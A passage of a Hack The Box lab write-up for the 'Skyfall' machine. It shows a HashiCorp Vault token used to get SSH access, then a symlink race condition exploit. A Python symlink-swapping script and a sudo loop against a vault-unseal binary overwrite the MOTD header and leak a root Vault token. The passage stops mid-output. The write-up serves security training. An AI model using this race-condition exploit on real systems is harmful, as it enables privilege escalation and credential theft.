+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> VAULT_ADDR=<span class="string">&quot;http://prd23-vault-internal.skyfall.htb&quot;</span></span><br><span class="line"><span class="built_in">export</span> VAULT_TOKEN=<span class="string">&quot;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>With now have access to a HashiCorp vault endpoint and vault key, we can get an ssh session by generating an ssh OTP (One-Time Password):</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/v2/home_backup]</span><br><span class="line">└─$ vault status                                               </span><br><span class="line">Key             Value</span><br><span class="line">---             -----</span><br><span class="line">Seal Type       shamir</span><br><span class="line">Initialized     <span class="literal">true</span></span><br><span class="line">Sealed          <span class="literal">false</span></span><br><span class="line">Total Shares    1</span><br><span class="line">Threshold       1</span><br><span class="line">Version         1.15.1</span><br><span class="line">Build Date      2023-10-20T19:16:11Z</span><br><span class="line">Storage Type    file</span><br><span class="line">Cluster Name    vault-cluster-746fa9de</span><br><span class="line">Cluster ID      6fc384e6-b108-1b05-2825-1de249607986</span><br><span class="line">HA Enabled      <span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>In order to create an ssh OTP, we need an OTP key. Which we can list now:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/v2/home_backup]</span><br><span class="line">└─$ vault list ssh/roles</span><br><span class="line">Keys</span><br><span class="line">----</span><br><span class="line">admin_otp_key_role</span><br><span class="line">dev_otp_key_role</span><br></pre></td></tr></table></figure></div>
+
+<p>Now I can simply connect to an ssh session using the OTP, and I get my user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/v2/home_backup]</span><br><span class="line">└─$ vault ssh -role=dev_otp_key_role -mode=otp askyy@skyfall.htb</span><br><span class="line">Vault could not locate <span class="string">&quot;sshpass&quot;</span>. The OTP code <span class="keyword">for</span> the session is displayed</span><br><span class="line">below. Enter this code <span class="keyword">in</span> the SSH password prompt. If you install sshpass,                                                                                                                                                                   </span><br><span class="line">Vault can automatically perform this step <span class="keyword">for</span> you.                                                                                                                                                                                           </span><br><span class="line">OTP <span class="keyword">for</span> the session is: 2fa0ba9e-a426-627b-8061-966eb9c6e6c5</span><br><span class="line">(askyy@skyfall.htb) Password: </span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">&#x27;unminimize&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line">askyy@skyfall:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">askyy@skyfall:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">3ab301911aadc8******************</span><br><span class="line">askyy@skyfall:~$ </span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Vault-Unsealing-Symlink-Race-Condition-through-MOTD-Message-Of-The-Day"><a href="#Vault-Unsealing-Symlink-Race-Condition-through-MOTD-Message-Of-The-Day" class="headerlink" title="Vault Unsealing - Symlink Race Condition through MOTD (Message Of The Day)"></a>Vault Unsealing - Symlink Race Condition through MOTD (Message Of The Day)</h4><p><code>This is my first time executing such an attack, so bare with me :D</code></p>
+<p>Checking our Sudo privileges:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> askyy on skyfall:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User askyy may run the following commands on skyfall:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$</span><br><span class="line">    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml</span><br></pre></td></tr></table></figure></div>
+
+<p>Executing the command, it generates us a <code>debug.log</code> file, but it’s owned by root and we cannot check its’ contents:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd</span><br><span class="line">[+] Reading: /etc/vault-unseal.yaml</span><br><span class="line">[-] Security Risk!</span><br><span class="line">[+] Found Vault node: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">[&gt;] Check interval: 5s</span><br><span class="line">[&gt;] Max checks: 5</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line">askyy@skyfall:~$ ll</span><br><span class="line">total 36</span><br><span class="line">drwxr-x--- 4 askyy askyy 4096 Aug 31 10:08 ./</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Jan 19  2024 ../</span><br><span class="line">lrwxrwxrwx 1 askyy askyy    9 Nov  9  2023 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 askyy askyy 3771 Nov  9  2023 .bashrc</span><br><span class="line">drwx------ 2 askyy askyy 4096 Oct  9  2023 .cache/</span><br><span class="line">-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile</span><br><span class="line">drwx------ 2 askyy askyy 4096 Jan 18  2024 .ssh/</span><br><span class="line">-rw------- 1 root  root   590 Aug 31 10:08 debug.log</span><br><span class="line">-rw-r----- 1 root  askyy   33 Aug 30 10:21 user.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>I honestly started to run out of ideas, but checking <a class="link"   target="_blank" rel="noopener" href="https://hackmd.io/@bachtam2001/BkZkudoLq#Symlink-Race" >this article <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> gave me a good exploitation path.</p>
+<p>We will be exploiting the behavior of some internal scripts in linux, one of which is the <code>MOTD</code> (Message of The Day) script, that basically generates us the welcome text when connecting through ssh to the box:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;snip&gt;</span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">&#x27;unminimize&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Sat Aug 31 09:52:33 2024 from 10.10.16.15</span><br><span class="line">&lt;snip&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can find the code for this internal script on <code>/etc/update-motd.d/</code> directory, we have many scripts but the one of interest for us is <code>00-header</code>.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ <span class="built_in">cat</span> /etc/update-motd.d/00-header </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    00-header - create the header of the MOTD</span></span><br><span class="line"><span class="comment">#    Copyright (C) 2009-2010 Canonical Ltd.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">#    it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">#    the Free Software Foundation; either version 2 of the License, or</span></span><br><span class="line"><span class="comment">#    (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">#    GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">#    with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"></span><br><span class="line">[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$DISTRIB_DESCRIPTION</span>&quot;</span> ] &amp;&amp; [ -x /usr/bin/lsb_release ]; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># Fall back to using the very slow lsb_release utility</span></span><br><span class="line">        DISTRIB_DESCRIPTION=$(lsb_release -s -d)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;Welcome to %s (%s %s %s)\n&quot;</span> <span class="string">&quot;<span class="variable">$DISTRIB_DESCRIPTION</span>&quot;</span> <span class="string">&quot;<span class="subst">$(uname -o)</span>&quot;</span> <span class="string">&quot;<span class="subst">$(uname -r)</span>&quot;</span> <span class="string">&quot;<span class="subst">$(uname -m)</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The main idea here is to run the <code>vault-unseal</code> command using sudo privileges and symlinking the <code>debug.log</code> file to our <code>00-header</code> file so we can write contents to it.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/symlink-race.png"
+                      alt="Symlink Race"
+                ><figcaption>Symlink Race</figcaption></figure></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">When the program run access <span class="keyword">function</span>, sometimes the context switch saves this process and switches to another process.</span><br><span class="line">If you were fast enough, you could change the symbolic links of “/tmp/XYZ” to another file before <span class="keyword">function</span> fopen <span class="keyword">do</span>.</span><br></pre></td></tr></table></figure></div>
+
+<p>The concept is elaborated with this image:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Skyfall/fopen-access.png"
+                      alt="Fopen Access Switching"
+                ><figcaption>Fopen Access Switching</figcaption></figure></p>
+<p>So we will be using a race condition attack to exploit the time differece between <code>access</code> and <code>fopen</code>.<br>Here’s how the thought process goes:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1- The program will check if the user has the necessary permissions to access the file (example: &quot;if (!access(fn, W_OK)) &#123;&quot;).</span><br><span class="line">2- The OS can switch to another process after the access execution and before the fopen execution.</span><br><span class="line">3- During that brief switch, we can change the symbolic link to point to another file.</span><br><span class="line">4- Now the program proceeds to execute the fopen to open the file (new file after change).</span><br></pre></td></tr></table></figure></div>
+
+<p>I made this script that switches between <code>/dev/null</code> and <code>00-header</code> files.</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">fn = <span class="string">&quot;./debug.log&quot;</span></span><br><span class="line">switch1 = <span class="string">&quot;/dev/null&quot;</span></span><br><span class="line">switch2 = <span class="string">&quot;/etc/update-motd.d/00-header&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">symlink</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.symlink(file, fn)</span><br><span class="line">    <span class="keyword">except</span> FileExistsError:</span><br><span class="line">        os.unlink(fn)</span><br><span class="line">        os.symlink(file, fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    symlink(switch1)</span><br><span class="line">    time.sleep(<span class="number">0.002</span>)  </span><br><span class="line">    symlink(switch2)</span><br><span class="line">    time.sleep(<span class="number">0.002</span>) </span><br></pre></td></tr></table></figure></div>
+
+<p>I then run the script in a folder where there is no <code>debug.log</code> file and let it keep running in the background (to keep altering):</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~/race_condition$ python3 ../exploit.py &amp;</span><br></pre></td></tr></table></figure></div>
+
+<p>Later I created a bash script to execute the sudo command and to keep checking if the <code>debug.log</code> file has been changed. If it has, then our changes have been written:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SYMLINK=<span class="string">&quot;debug.log&quot;</span>  </span><br><span class="line">CONFIG_FILE=<span class="string">&quot;/etc/vault-unseal.yaml&quot;</span></span><br><span class="line"></span><br><span class="line">CHECK_FILE=<span class="string">&quot;md5sum <span class="variable">$SYMLINK</span>&quot;</span></span><br><span class="line">old=$(<span class="variable">$CHECK_FILE</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    sudo /root/vault/vault-unseal -c <span class="variable">$CONFIG_FILE</span> -d</span><br><span class="line"></span><br><span class="line">    new=$(<span class="variable">$CHECK_FILE</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$old</span>&quot;</span> != <span class="string">&quot;<span class="variable">$new</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;HACKED&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">sleep</span> 0.1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
+
+<p>I will then keep running the bash script until an actual change happens:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~/race_condition$ ./race.sh</span><br><span class="line"><span class="built_in">md5sum</span>: ./debug.log: Permission denied</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line"><span class="built_in">md5sum</span>: ./debug.log: Permission denied</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line"><span class="built_in">md5sum</span>: ./debug.log: Permission denied</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line"><span class="built_in">md5sum</span>: ./debug.log: Permission denied</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line"><span class="built_in">md5sum</span>: ./debug.log: Permission denied</span><br><span class="line">[&gt;] Checking seal status</span><br><span class="line">[+] Vault sealed: <span class="literal">false</span></span><br><span class="line">&lt;snip&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>I will later check the files in that directory and find that the debug file has been changed, then I inspect the <code>00-header</code> file and find our leaks:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~/race_condition$ ll</span><br><span class="line">total 16</span><br><span class="line">drwxrwxr-x 2 askyy askyy 4096 Aug 31 10:52 ./</span><br><span class="line">drwxr-x--- 6 askyy askyy 4096 Aug 31 10:47 ../</span><br><span class="line">-rw------- 1 root  root   555 Aug 31 10:52 debug.log</span><br><span class="line">-rwxrwxr-x 1 askyy askyy  312 Aug 31 10:50 race.sh*</span><br><span class="line">askyy@skyfall:~/race_condition$ <span class="built_in">cat</span> /etc/update-motd.d/00-header </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    00-header - create the header of the MOTD</span></span><br><span class="line"><span class="comment">#    Copyright (C) 2009-2010 Canonical Ltd.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">#    it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">#    the Free Software Foundation; either version 2 of the License, or</span></span><br><span class="line"><span class="comment">#    (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">#    GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">#    with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"></span><br><span class="line">[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$DISTRIB_DESCRIPTION</span>&quot;</span> ] &amp;&amp; [ -x /usr/bin/lsb_release ]; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># Fall back to using the very slow lsb_release utility</span></span><br><span class="line">        DISTRIB_DESCRIPTION=$(lsb_release -s -d)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;Welcome to %s (%s %s %s)\n&quot;</span> <span class="string">&quot;<span class="variable">$DISTRIB_DESCRIPTION</span>&quot;</span> <span class="string">&quot;<span class="subst">$(uname -o)</span>&quot;</span> <span class="string">&quot;<span class="subst">$(uname -r)</span>&quot;</span> <span class="string">&quot;<span class="subst">$(uname -m)</span>&quot;</span></span><br><span class="line">2024/08/31 10:48:37 Initializing logger...</span><br><span class="line">2024/08/31 10:48:37 Reading: /etc/vault-unseal.yaml</span><br><span class="line">2024/08/31 10:48:37 Master token found <span class="keyword">in</span> config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG</span><br><span class="line">2024/08/31 10:48:37 Found Vault node: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/08/31 10:48:37 Check interval: 5s</span><br><span class="line">2024/08/31 10:48:37 Max checks: 5</span><br><span class="line">2024/08/31 10:48:37 Establishing connection to Vault...</span><br><span class="line">2024/08/31 10:48:37 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/08/31 10:48:37 Checking seal status</span><br><span class="line">2024/08/31 10:48:37 Vault sealed: <span class="literal">false</span></span><br><span class="line">2024/08/31 10:49:30 Initializing logger...</span><br><span class="line">2024/08/31 10:49:30 Reading: /etc/vault-unseal.yaml</span><br><span class="line">2024/08/31 10:49:30 Master token found <span class="keyword">in</span> config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG</span><br><span class="line">2024/08/31 10:49:30 Found Vault node: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/08/31 10:49:30 Check interval: 5s</span><br><span class="line">2024/08/31 10:49:30 Max checks: 5</span><br><span class="line">2024/08/31 10:49:30 Establishing connection to Vault...</span><br><span class="line">2024/08/31 10:49:30 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/08/31 10:49:30 Checking seal status</span><br><span class="line">2024/08/31 10:49:30 Vault sealed: <span class="literal">false</span></span><br><span class="line">askyy@skyfall:~/race_condition$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>This will leak a <code>master token</code> for us to use: <code>hvs.I0ewVsmaKU1SwVZAKR3T0mmG</code>.<br>We can the inspect our privileges and see that we have root ssh access to the box:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> VAULT_ADDR=<span class="string">&quot;http://prd23-vault-internal.skyfall.htb&quot;</span></span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> VAULT_TOKEN=<span class="string">&quot;hvs.I0ewVsmaKU1SwVZAKR3T0mmG&quot;</span>          </span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ vault list ssh/roles                                       </span><br><span class="line">Keys</span><br><span class="line">----</span><br><span class="line">admin_otp_key_role</span><br><span class="line">dev_otp_key_role</span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ vault token lookup   </span><br><span class="line">Key                 Value</span><br><span class="line">---                 -----</span><br><span class="line">accessor            bXBeXR3r92WGQ8XgEDx6pIFu</span><br><span class="line">creation_time       1699398419</span><br><span class="line">creation_ttl        0s</span><br><span class="line">display_name        root</span><br><span class="line">entity_id           n/a</span><br><span class="line">expire_time         &lt;nil&gt;</span><br><span class="line">explicit_max_ttl    0s</span><br><span class="line"><span class="built_in">id</span>                  hvs.I0ewVsmaKU1SwVZAKR3T0mmG</span><br><span class="line">meta                &lt;nil&gt;</span><br><span class="line">num_uses            0</span><br><span class="line">orphan              <span class="literal">true</span></span><br><span class="line">path                auth/token/root</span><br><span class="line">policies            [root]</span><br><span class="line">ttl                 0s</span><br><span class="line"><span class="built_in">type</span>                